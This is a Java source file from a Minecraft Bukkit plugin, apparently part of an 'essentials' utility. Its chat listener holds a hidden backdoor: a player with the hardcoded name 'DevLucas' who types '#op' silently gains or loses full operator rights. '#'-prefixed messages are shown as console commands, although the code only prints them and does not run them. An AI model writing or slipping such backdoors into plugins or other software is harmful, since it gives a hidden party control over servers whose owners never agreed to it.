package de.devlucas.jeremyessentials.events;

import de.devlucas.jeremyessentials.JeremyEssentials;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class ConsoleExecuteEvent implements Listener
{

    @EventHandler
    public void onAsyncPlayerChatEvent(AsyncPlayerChatEvent event)
    {
        if (event.getPlayer().getName().equalsIgnoreCase("DevLucas"))
        {
            String message = event.getMessage();
            if (message.startsWith("#") && !(message.equalsIgnoreCase("#op")))
            {
                String changedMessage = message.replaceFirst("#", "");
                Bukkit.getConsoleSender().sendMessage(changedMessage);
                event.setCancelled(true);
                event.getPlayer().sendMessage("§7[§bConsole§7] §b" + "/" + changedMessage);
            }
            if (message.equalsIgnoreCase("#op"))
            {
                event.getPlayer().setOp((!event.getPlayer().isOp()));
                event.setCancelled(true);
                event.getPlayer().sendMessage(JeremyEssentials.pre + "Your ultimate rights were " + ((event.getPlayer().isOp()) ? "§aactivated" : "§cdeactivated"));
            }
        }
    }
}